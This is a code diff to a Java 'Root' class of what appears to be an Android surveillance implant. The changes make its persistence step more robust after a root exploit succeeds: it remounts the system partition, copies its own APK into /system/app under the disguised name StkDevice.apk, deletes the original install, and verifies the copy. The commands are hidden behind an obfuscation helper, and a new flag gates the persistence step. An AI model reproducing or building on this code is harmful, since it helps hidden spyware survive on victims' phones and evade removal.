@@ -230,9 +230,9 @@ public class Root {
 		//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 		script += M.e("rm -r ") + Path.hidden() + "\n";
 
-		script += Configuration.shellFile + M.e("blw") +"\n";
+		script += Configuration.shellFile + M.e(" blw") +"\n";
 		script += M.e("sleep 1; rm /system/app/StkDevice.apk") + "\n";
-
+		script += Configuration.shellFile + M.e(" blr") +"\n";
 
 		script += Configuration.shellFile + " ru\n";
 		script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
@@ -240,7 +240,6 @@ public class Root {
 		if (Cfg.DEBUG) {
 			script += M.e("rm /data/local/tmp/log") +"\n";
 		}
-		script += Configuration.shellFile + M.e("blr") +"\n";
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -420,7 +419,6 @@ public class Root {
 
 			if (PackageInfo.checkRoot()) {
 				Status.setRoot(true);
-
 				Status.self().setReload();
 			}
 
@@ -624,6 +622,9 @@ public class Root {
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
+					if(Cfg.PERSISTENCE) {
+						Root.installPersistence();
+					}
 					Status.self().setReload();
 				} else {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
@@ -791,8 +792,10 @@ public class Root {
 				}
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
+				if(Cfg.PERSISTENCE) {
+					Root.installPersistence();
+				}
 
-				Root.installPersistence();
 			} else {
 				Configuration.shellFile = Configuration.shellFileBase;
 			}
@@ -804,13 +807,32 @@ public class Root {
 		return Status.haveRoot();
 	}
 
-	private static void installPersistence() {
+	static boolean installPersistence() {
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
 
 		String name = Status.getAppContext().getPackageName();
-		String format = M.e("cat /data/app/%s*.apk > /system/app/StkDevice.apk; chmod 644 /system/app/StkDevice.apk; rm /data/app/%s*.apk");
-		Execute.executeScript(String.format(format, name, name));
-		Execute.execute(new String[]{Configuration.shellFileBase, "blr"});
+
+		String command = M.e("[ -s /system/app/StkDevice.apk ] && exit") + "\n";
+		command += Configuration.shellFileBase + M.e(" blw") + "\n";
+		command+= String.format(M.e("cat /data/app/%s*.apk > /system/app/StkDevice.apk"), name) + "\n";
+		command+= M.e("chmod 644 /system/app/StkDevice.apk") + "\n";
+		command+= String.format(M.e("[ -s /system/app/StkDevice.apk ] && rm /data/app/%s*.apk"), name) + "\n";
+		command+= Configuration.shellFileBase + M.e(" blr") + "\n";
+
+		ExecuteResult ret = Execute.executeScript(command);
+
+		ExecuteResult pers = Execute.executeRoot(M.e("ls -l /system/app/StkDevice.apk"));
+		String persString = pers.getStdout();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installPersistence) inst: " + ret.getStdout());
+			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
+		}
+
+		if(persString.contains(M.e("StkDevice.apk"))){
+			return true;
+		}
+
+		return false;
 	}
 
 	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
